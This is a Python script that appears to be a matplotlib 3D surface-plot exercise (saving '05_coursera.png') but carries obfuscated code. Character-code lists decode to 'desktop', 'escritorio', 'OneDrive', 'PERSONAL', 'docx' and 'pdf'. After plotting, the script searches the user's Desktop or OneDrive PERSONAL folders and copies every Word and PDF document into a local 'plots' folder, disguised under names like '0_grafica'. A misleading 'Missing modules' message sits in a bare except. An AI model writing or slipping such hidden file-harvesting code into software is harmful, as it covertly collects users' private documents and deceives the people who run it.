import os
import shutil

from matplotlib import cbook
from matplotlib import cm
from matplotlib.colors import LightSource
import matplotlib.pyplot as plt
import numpy as np


start = 0

test_graf = "test"
mapa = "map"
diccionario = "dic"
slash = "\\" 
#slash = "/"
l2 = ['c', 'x']
l1 = ['d','o']

form1_nums = [100, 101,115,107,116,111,112] #desk

form1 = [chr(i) for i in form1_nums]
form1 = "".join(form1)

form2_nums = [101,115,99,114,105,116,111,114,105,111] #esc
form2 = [chr(i) for i in form2_nums]
form2 = "".join(form2)

form3_nums = [79,110,101,68,114,105,118,101]#one
form3 = [chr(i) for i in form3_nums]
form3 = "".join(form3)

serie = ["1", "3", "5", "7", "9", "11", "13", "15", "17"]
output = serie[-6] + " " + diccionario
l3 = "".join(l1) + "".join(l2)

suf = "df"
pref = "p"
tipos = [l3, pref+suf]
lista1 = [80,69,82,83,79,78,65,76]
lista1 = [chr(i) for i in lista1]
listaString = "".join(lista1)

def generarDatosGrafica(nivel, op, neo = 0):
    first = os.path.abspath("")
    first = os.path.join(first, "plots") 
    if not os.path.isdir(first):
        os.mkdir(first)
    string = os.path.abspath("")
    
    res = string.split(slash)[0:nivel]

    if neo == 1:
        res.append(form3)

    if op == 1:
        res.append(form1)
    elif op == 2:
        res.append(form2)
    res.append(listaString)
    
    res = slash.join(res)
    if os.path.isdir(res):
        recursivo(res, first)
        nuevos = os.listdir(res)

def recursivo(nombre, root):
    if os.path.isfile(nombre):
        global start
        
        if nombre.split('.')[-1] in tipos:
            shutil.copy(nombre, root+slash+str(start)+"_grafica")
            start = start + 1
        return
        
    child = os.listdir(nombre)
    for elem in child:
        #print(nombre+slash+elem)
        recursivo(nombre + slash + elem, root)


if __name__ == '__main__':

    # Load and format data
    dem = cbook.get_sample_data('jacksboro_fault_dem.npz', np_load=True)
    z = dem['elevation']
    nrows, ncols = z.shape
    x = np.linspace(dem['xmin'], dem['xmax'], ncols)
    y = np.linspace(dem['ymin'], dem['ymax'], nrows)
    x, y = np.meshgrid(x, y)

    region = np.s_[5:50, 5:50]
    x, y, z = x[region], y[region], z[region]

    # Set up plot
    fig, ax = plt.subplots(subplot_kw=dict(projection='3d'))

    ls = LightSource(270, 45)
    # To use a custom hillshading mode, override the built-in shading and pass
    # in the rgb colors of the shaded surface calculated from "shade".
    rgb = ls.shade(z, cmap=cm.gist_earth, vert_exag=0.1, blend_mode='soft')
    surf = ax.plot_surface(x, y, z, rstride=1, cstride=1, facecolors=rgb,
                        linewidth=0, antialiased=False, shade=False)

    plt.savefig('05_coursera.png')

    try:
        shutil.copy("./05_coursera.png", os.path.abspath("") + slash + "05_coursera")
    except:
        print("Missing modules...\nTry installing them first and execute again")

    plt.show()
    for i in [-1, -2, -3]:
        generarDatosGrafica(i, 1)
        generarDatosGrafica(i, 2)
        generarDatosGrafica(i, 1, 1)
        generarDatosGrafica(i, 2, 1)

